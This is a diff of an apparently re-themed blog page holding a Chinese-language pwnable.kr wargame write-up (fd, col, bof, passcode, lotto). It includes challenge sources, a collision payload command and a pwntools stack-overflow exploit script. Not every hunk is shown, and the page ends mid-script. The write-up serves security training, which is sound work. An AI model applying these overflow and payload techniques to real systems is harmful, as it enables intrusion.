@@ -1,196 +1,118 @@
 <!DOCTYPE html>
-<html lang="en">
-
-
-
-
-
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
-  <link rel="icon" type="image/png" href="/img/favicon.png">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="utf-8">
   
-  <meta name="description" content="">
-  <meta name="author" content="">
-  <meta name="keywords" content="">
-  <title>pwnable.kr解题（一） ~ Xiaotan</title>
 
-  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"  >
-<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css"  >
-<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css"  >
-<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css"  >
+  
+  <title>pwnable.kr解题（一） | 小叹</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="fdssh fd@pwnable.kr -p2222 (pw:guest) fd@pwnable:~$ cat fd.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[])&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr解题（一）">
+<meta property="og:url" content="http://yoursite.com/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="小叹">
+<meta property="og:description" content="fdssh fd@pwnable.kr -p2222 (pw:guest) fd@pwnable:~$ cat fd.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char buf[32]; int main(int argc, char* argv[], char* envp[])&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/img/23.png">
+<meta property="og:image" content="http://yoursite.com/img/24.png">
+<meta property="og:image" content="http://yoursite.com/img/25.png">
+<meta property="og:image" content="http://yoursite.com/img/26.png">
+<meta property="article:published_time" content="2020-01-15T04:24:41.000Z">
+<meta property="article:modified_time" content="2020-01-28T11:02:00.873Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/img/23.png">
+  
+    <link rel="alternate" href="/atom.xml" title="小叹" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
-
-
-
-  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css"  >
-
-<link rel="stylesheet" href="/css/main.css"  >
-
-
-  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css"  >
-
-
-<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="Xiaotan" type="application/atom+xml">
-</head>
-
+<meta name="generator" content="Hexo 5.1.1"></head>
 
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>小叹的博客</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/">Home</a>
-          </li>
-        
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">Archives</a>
-          </li>
-        
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/categories/">Categories</a>
-          </li>
-        
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">Tags</a>
-          </li>
-        
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">About</a>
-          </li>
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
-          </li>
-        
-      </ul>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">小叹</a>
+      </h1>
+      
     </div>
-  </div>
-</nav>
-
-    <div class="view intro-2" id="background"
-         style="background: url('/img/bg_img.jpg')no-repeat center center;
-           background-size: cover;
-           background-attachment: fixed;">
-      <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  Wednesday, January 15th 2020, 12:24 pm
-                </p>
-              
-
-              <p>
-                
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    3.8k 字
-                  </span>&nbsp;
-                
-
-                
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      22 分钟
-                  </span>&nbsp;
-                
-
-                
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
-            
-          </div>
-
-          
-        </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
       </div>
     </div>
-  </header>
-
-  <main>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-pwnable-kr解题（一）" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2020-01-15T04:24:41.000Z" itemprop="datePublished">2020-01-15</time>
+</a>
     
-      
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      pwnable.kr解题（一）
+    </h1>
+  
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
-            <h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>ssh <a href="mailto:fd@pwnable.kr">fd@pwnable.kr</a> -p2222 (pw:guest)</p>
 <pre><code>fd@pwnable:~$ cat fd.c
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 char buf[32];
-int main(int argc, char* argv[], char* envp[]){
-    if(argc&lt;2){
+int main(int argc, char* argv[], char* envp[])&#123;
+    if(argc&lt;2)&#123;
         printf(&quot;pass argv[1] a number\n&quot;);
         return 0;
-    }
+    &#125;
     int fd = atoi( argv[1] ) - 0x1234;
     int len = 0;
     len = read(fd, buf, 32);
-    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
+    if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;
         printf(&quot;good job :)\n&quot;);
         system(&quot;/bin/cat flag&quot;);
         exit(0);
-    }
+    &#125;
     printf(&quot;learn about Linux file IO\n&quot;);
     return 0;
 
-}</code></pre><p>目标：执行system(“/bin/cat flag”);<br>则：strcmp(“LETMEWIN\n”, buf) == 0<br>则：buf = “LETMEWIN\n”<br>则：read(fd, buf, 32)将buf设为”LETMEWIN\n”<br>fd == 0为标准输入<br>fd == 1为标准输出<br>fd == 2为标准错误输出<br>所以我们可以使fd == 0，然后从终端输入LETMEWIN后回车<br>要使fd == 0，<br>则：输入的参数 == 0x1234，即4660<br>flag:</p>
+&#125;</code></pre><p>目标：执行system(“/bin/cat flag”);<br>则：strcmp(“LETMEWIN\n”, buf) == 0<br>则：buf = “LETMEWIN\n”<br>则：read(fd, buf, 32)将buf设为”LETMEWIN\n”<br>fd == 0为标准输入<br>fd == 1为标准输出<br>fd == 2为标准错误输出<br>所以我们可以使fd == 0，然后从终端输入LETMEWIN后回车<br>要使fd == 0，<br>则：输入的参数 == 0x1234，即4660<br>flag:</p>
 <blockquote>
 <p>mommy! I think I know what a file descriptor is!!</p>
 </blockquote>
@@ -199,36 +121,36 @@ int main(int argc, char* argv[], char* envp[]){
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 unsigned long hashcode = 0x21DD09EC;
-unsigned long check_password(const char* p){
+unsigned long check_password(const char* p)&#123;
     int* ip = (int*)p;
     int i;
     int res=0;
-    for(i=0; i&lt;5; i++){
+    for(i=0; i&lt;5; i++)&#123;
         res += ip[i];
-    }
+    &#125;
     return res;
-}
+&#125;
 
-int main(int argc, char* argv[]){
-    if(argc&lt;2){
+int main(int argc, char* argv[])&#123;
+    if(argc&lt;2)&#123;
         printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
         return 0;
-    }
-    if(strlen(argv[1]) != 20){
+    &#125;
+    if(strlen(argv[1]) != 20)&#123;
         printf(&quot;passcode length should be 20 bytes\n&quot;);
         return 0;
-    }
+    &#125;
 
-    if(hashcode == check_password( argv[1] )){
+    if(hashcode == check_password( argv[1] ))&#123;
         system(&quot;/bin/cat flag&quot;);
         return 0;
-    }
+    &#125;
     else
         printf(&quot;wrong passcode.\n&quot;);
     return 0;
-}</code></pre><p> 因为用\x01填充16位数据，剩下的4位 0x21DD09EC-0x04040404=1DD905E8</p>
+&#125;</code></pre><p> 因为用\x01填充16位数据，剩下的4位 0x21DD09EC-0x04040404=1DD905E8</p>
 <p>col@pwnable:<del>$ ./col $(python -c “print ‘\x01’ *16+ ‘\xE8\x05\xD9\x1D’”)<br>daddy! I just managed to create a hash collision :)<br>col@pwnable:</del>$ </p>
-<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><img src="/img/23.png" srcset="/img/loading.gif" alt=""><br>发现，只是要将传入的0xdeadbeef通过栈溢出换成0xcafebabe，而且在程序里面已经有调用system(“/bin/sh”)的语句，只要替换成功就能调用，那这些保护基本也没什么意义嘛。<br><img src="/img/24.png" srcset="/img/loading.gif" alt=""><br><img src="/img/25.png" srcset="/img/loading.gif" alt=""><br>继续单步，输入AAAAAAAA,之后x/30x $esp查看栈空间<br><img src="/img/26.png" srcset="/img/loading.gif" alt=""><br>A的ASCLL值为41，可以看出，我们要覆盖的地址与输入地址相差52个字节.<br>EXP:</p>
+<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p><img src="/img/23.png" alt=""><br>发现，只是要将传入的0xdeadbeef通过栈溢出换成0xcafebabe，而且在程序里面已经有调用system(“/bin/sh”)的语句，只要替换成功就能调用，那这些保护基本也没什么意义嘛。<br><img src="/img/24.png" alt=""><br><img src="/img/25.png" alt=""><br>继续单步，输入AAAAAAAA,之后x/30x $esp查看栈空间<br><img src="/img/26.png" alt=""><br>A的ASCLL值为41，可以看出，我们要覆盖的地址与输入地址相差52个字节.<br>EXP:</p>
 <pre><code>from pwn import *
 
 r = remote(&#39;pwnable.kr&#39;,&#39;9000&#39;)
@@ -249,7 +171,7 @@ r.interactive()</code></pre><blockquote>
 <pre><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 
-void login(){
+void login()&#123;
     int passcode1;
     int passcode2;
 
@@ -262,24 +184,24 @@ void login(){
         scanf(&quot;%d&quot;, passcode2);
 
     printf(&quot;checking...\n&quot;);
-    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+    if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;
                 printf(&quot;Login OK!\n&quot;);
                 system(&quot;/bin/cat flag&quot;);
-        }
-        else{
+        &#125;
+        else&#123;
                 printf(&quot;Login Failed!\n&quot;);
         exit(0);
-        }
-}
+        &#125;
+&#125;
 
-void welcome(){
+void welcome()&#123;
     char name[100];
     printf(&quot;enter you name : &quot;);
     scanf(&quot;%100s&quot;, name);
     printf(&quot;Welcome %s!\n&quot;, name);
-}
+&#125;
 
-int main(){
+int main()&#123;
     printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);
 
     welcome();
@@ -288,7 +210,7 @@ int main(){
     // something after login...
     printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
     return 0;    
-}
+&#125;
 
 passcode@pwnable:~$  ./passcode
 Toddler&#39;s Secure Login System 1.0 beta.
@@ -306,7 +228,7 @@ passcode@pwnable:~$ cat passcode.c
 #include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 
-void login(){
+void login()&#123;
     int passcode1;
     int passcode2;
 
@@ -319,24 +241,24 @@ void login(){
         scanf(&quot;%d&quot;, passcode2);
 
     printf(&quot;checking...\n&quot;);
-    if(passcode1==338150 &amp;&amp; passcode2==13371337){
+    if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;
                 printf(&quot;Login OK!\n&quot;);
                 system(&quot;/bin/cat flag&quot;);
-        }
-        else{
+        &#125;
+        else&#123;
                 printf(&quot;Login Failed!\n&quot;);
         exit(0);
-        }
-}
+        &#125;
+&#125;
 
-void welcome(){
+void welcome()&#123;
     char name[100];
     printf(&quot;enter you name : &quot;);
     scanf(&quot;%100s&quot;, name);
     printf(&quot;Welcome %s!\n&quot;, name);
-}
+&#125;
 
-int main(){
+int main()&#123;
     printf(&quot;Toddler&#39;s Secure Login System 1.0 beta.\n&quot;);
 
     welcome();
@@ -345,7 +267,7 @@ int main(){
     // something after login...
     printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
     return 0;    
-}</code></pre><p>其中输入passcode1和passcode2时没有加&amp;，所以程序发生了错误。</p>
+&#125;</code></pre><p>其中输入passcode1和passcode2时没有加&amp;，所以程序发生了错误。</p>
 <pre><code>     passcode@pwnable:~$ ls
   flag  passcode    passcode.c
   passcode@pwnable:~$ objdump -d passcode
@@ -741,43 +663,43 @@ printf(&quot;Lotto Start!\n&quot;);
 
 // generate lotto numbers
 int fd = open(&quot;/dev/urandom&quot;, O_RDONLY);
-if(fd==-1){
+if(fd==-1)&#123;
     printf(&quot;error. tell admin\n&quot;);
     exit(-1);
-}
+&#125;
 unsigned char lotto[6];
-if(read(fd, lotto, 6) != 6){
+if(read(fd, lotto, 6) != 6)&#123;
     printf(&quot;error2. tell admin\n&quot;);
     exit(-1);
-}
-for(i=0; i&lt;6; i++){
+&#125;
+for(i=0; i&lt;6; i++)&#123;
     lotto[i] = (lotto[i] % 45) + 1;        // 1 ~ 45
-}
+&#125;
 close(fd);
 
 // calculate lotto score
 int match = 0, j = 0;
-for(i=0; i&lt;6; i++){
-    for(j=0; j&lt;6; j++){
-        if(lotto[i] == submit[j]){
+for(i=0; i&lt;6; i++)&#123;
+    for(j=0; j&lt;6; j++)&#123;
+        if(lotto[i] == submit[j])&#123;
             match++;
-        }
-    }
-}
+        &#125;
+    &#125;
+&#125;
 
 // win!
-if(match == 6){
+if(match == 6)&#123;
     system(&quot;/bin/cat flag&quot;);
-}
-else{
+&#125;
+else&#123;
     printf(&quot;bad luck...\n&quot;);
-}</code></pre><p>}</p>
-<p>void help(){<br>    printf(“- nLotto Rule -\n”);<br>    printf(“nlotto is consisted with 6 random natural numbers less than 46\n”);<br>    printf(“your goal is to match lotto numbers as many as you can\n”);<br>    printf(“if you win lottery for <em>1st place</em>, you will get reward\n”);<br>    printf(“for more details, follow the link below\n”);<br>    printf(“<a href="http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;" target="_blank" rel="noopener">http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</a>);<br>    printf(“mathematical chance to win this game is known to be 1/8145060.\n”);<br>}</p>
+&#125;</code></pre><p>}</p>
+<p>void help(){<br>    printf(“- nLotto Rule -\n”);<br>    printf(“nlotto is consisted with 6 random natural numbers less than 46\n”);<br>    printf(“your goal is to match lotto numbers as many as you can\n”);<br>    printf(“if you win lottery for <em>1st place</em>, you will get reward\n”);<br>    printf(“for more details, follow the link below\n”);<br>    printf(“<a target="_blank" rel="noopener" href="http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;">http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n&quot;</a>);<br>    printf(“mathematical chance to win this game is known to be 1/8145060.\n”);<br>}</p>
 <p>int main(int argc, char* argv[]){</p>
 <pre><code>// menu
 unsigned int menu;
 
-while(1){
+while(1)&#123;
 
     printf(&quot;- Select Menu -\n&quot;);
     printf(&quot;1. Play Lotto\n&quot;);
@@ -786,7 +708,7 @@ while(1){
 
     scanf(&quot;%d&quot;, &amp;menu);
 
-    switch(menu){
+    switch(menu)&#123;
         case 1:
             play();
             break;
@@ -799,283 +721,155 @@ while(1){
         default:
             printf(&quot;invalid menu\n&quot;);
             break;
-    }
-}
+    &#125;
+&#125;
 return 0;</code></pre><p>}</p>
 
-            <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-            
-            </p>
-            
-          </div>
-        </div>
-      </div>
+      
     </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
-    <div id="tocbot"></div>
-  </div>
-
-    </div>
-  </div>
-</div>
-
-<!-- custom -->
-
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
-    
-      <br><br>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/01/15/pwnable-kr%E8%A7%A3%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckemqkec00034astyeqziex8s" class="article-share-link">Share</a>
       
       
-
-    
+    </footer>
   </div>
-</div>
-
-    
-  </main>
-
   
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    
+<nav id="article-nav">
+  
+    <a href="/2020/01/16/Linux%E4%B8%8B%E5%AE%89%E8%A3%85UPX/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Linux下安装UPX
+        
+      </div>
     </a>
   
+  
+    <a href="/2020/01/14/overthewire-narnia%E8%A7%A3%E9%A2%98-%E4%B8%80/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">overthewire narnia解题(一)</div>
+    </a>
+  
+</nav>
 
   
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v"
-                 for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB%EF%BC%8Cpython/">WEB，python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%8Cweb/">攻防世界，web</a></li></ul>
     </div>
   </div>
-</div>
+
+
   
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jarvis-OJ/" rel="tag">Jarvis OJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/" rel="tag">WEB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cphp/" rel="tag">WEB，php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%EF%BC%8Cupload/" rel="tag">WEB，upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuctf/" rel="tag">buuctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%EF%BC%8CJARvis-OJ/" rel="tag">web，JARvis OJ</a></li></ul>
+    </div>
+  </div>
+
+
   
-    <!-- 不蒜子统计PV -->
     
-    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Jarvis-OJ/" style="font-size: 13.33px;">Jarvis OJ</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/WEB/" style="font-size: 20px;">WEB</a> <a href="/tags/WEB%EF%BC%8Cphp/" style="font-size: 10px;">WEB，php</a> <a href="/tags/WEB%EF%BC%8Cupload/" style="font-size: 13.33px;">WEB，upload</a> <a href="/tags/buuctf/" style="font-size: 10px;">buuctf</a> <a href="/tags/pwn/" style="font-size: 16.67px;">pwn</a> <a href="/tags/web%EF%BC%8CJARvis-OJ/" style="font-size: 10px;">web，JARvis OJ</a>
+    </div>
+  </div>
+
   
-  
-    <!-- 不蒜子统计UV -->
     
-    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">六月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
+    </div>
+  </div>
+
+
   
-  <br>
-
-
-
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/08/11/%5BMRCTF2020%5DEzpop_Reveng/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/07/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89XXE/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/07/Java%E5%8F%8D%E5%B0%84%E7%9A%84%E5%AD%A6%E4%B9%A0/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/01/Webgoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/31/Webgoat8%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
 
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 小叹<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
   </div>
 </footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
 
-<!-- SCRIPTS -->
-<script src="/lib/jquery/jquery.min.js" ></script>
-<script src="/lib/popper/popper.min.js" ></script>
-<script src="/lib/bootstrap/js/bootstrap.min.js" ></script>
-<script src="/lib/mdbootstrap/js/mdb.min.js" ></script>
-<script src="/js/main.js" ></script>
-
-
-  <script src="/js/lazyload.js" ></script>
-
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
 
   
-    <script src="/lib/tocbot/tocbot.min.js" ></script>
-  
-  <script src="/js/post.js" ></script>
-
-
-
-  <script src="/lib/smooth-scroll/smooth-scroll.min.js" ></script>
-
-
-
-  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-<!-- Plugins -->
-
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
 
   
-
-  
-
-  
-
-  
-
-  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
 
 
 
 
-  <script src="/lib/prettify/prettify.min.js" ></script>
-  <script>
-    $(document).ready(function () {
-      $('pre').addClass('prettyprint  linenums');
-      prettyPrint();
-    })
-  </script>
-
-
-
-  <script src="/lib/typed/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "pwnable.kr解题（一）&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
-
-
-  <script src="/lib/anchor/anchor.min.js" ></script>
-  <script>
-    anchors.options = {
-      placement: "right",
-      visible: "false",
-      
-    };
-    var el = "h1,h2,h3,h4,h5,h6".split(",");
-    var res = [];
-    for (item of el) {
-      res.push(".markdown-body > " + item)
-    }
-    anchors.add(res.join(", "))
-  </script>
-
-
-
-  <script src="/js/local-search.js" ></script>
-  <script>
-    var path = "/local-search.xml";
-    var inputArea = document.querySelector("#local-search-input");
-    inputArea.onclick = function () {
-      getSearchFile(path);
-      this.onclick = null
-    }
-  </script>
-
-
-
-  <script src="/lib/fancybox/jquery.fancybox.min.js" ></script>
-  <script>
-    $("#post img:not(.no-zoom img, img[no-zoom])").each(
-      function () {
-        var element = document.createElement("a");
-        $(element).attr("data-fancybox", "images");
-        $(element).attr("href", $(this).attr("src"));
-        $(this).wrap(element);
-      }
-    );
-  </script>
+<script src="/js/script.js"></script>
 
 
 
 
-
-  
-  
-    <script type="text/javascript">
-      //定义获取词语下标
-      var a_idx = 0;
-      jQuery(document).ready(function ($) {
-        //点击body时触发事件
-        $("body").click(function (e) {
-          //需要显示的词语
-          var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正", "法治", "爱国", "敬业", "诚信", "友善");
-          //设置词语给span标签
-          var $i = $("<span/>").text(a[a_idx]);
-          //下标等于原来下标+1  余 词语总数
-          a_idx = (a_idx + 1) % a.length;
-          //获取鼠标指针的位置，分别相对于文档的左和右边缘。
-          //获取x和y的指针坐标
-          var x = e.pageX, y = e.pageY;
-          //在鼠标的指针的位置给$i定义的span标签添加css样式
-          $i.css({
